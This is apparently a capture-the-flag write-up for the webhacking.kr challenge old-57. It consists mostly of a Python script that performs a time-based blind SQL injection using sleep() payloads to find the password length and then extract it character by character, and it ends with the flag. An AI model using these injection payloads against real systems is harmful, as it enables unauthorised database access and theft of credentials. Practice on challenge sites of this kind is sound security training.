Webhacking old-57 Solution

another sql injection, same as usual. [old-57]

import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "https://webhacking.kr/challenge/web-34/?msg=dcab&se="
SESSION_ID = "1123"
cookies = {'PHPSESSID':SESSION_ID}
params ={'msg':'dcba'}
headers = {
    "Cache-Control": "no-cache",
    "Pragma": "no-cache"
}

password = "FLAG{y2u.be/kmPgjr0EL64}"
# find the length of the password
for i in range(1, 100):
    payload = f"IF(length(pw)={i},sleep(5),1)# "
    # print(f"{i}: {payload}")
    before = time.time()
    response = requests.get(URL+payload, cookies=cookies, headers=headers)
    # print(response.text)
    after = time.time()
    
    # print(f"Time: {after - before} seconds")
    print(i)
    if after - before > 5:
        break

length = i
print(f"Length: {length}")
while len(password) < length:    
    for c in string.printable:
        hex = string_to_hex((password+c).replace("_", r"\_").replace('.',r'\.').replace('%',r'\%'))
        payload = f"IF(ascii(substr(pw,{len(password)+1},1)like({ord(c)}),sleep(5),1)#"
        # print(f"{c}: {payload}")
        print(c)
        before = time.time()
        response = requests.get(URL+payload, cookies=cookies, headers=headers)
        # print(response.text)
        after = time.time()
        
        # print(f"Time: {after - before} seconds")
        if after - before > 5:
            i += 1
            password += c
            print(password)
            break
    

# ?score=770%20or%20left(id,4)like(0x61646D69)#6E)"

# params = {'score':'1'}

# print(response.text)

Flag: FLAG{y2u.be/kmPgjr0EL64}
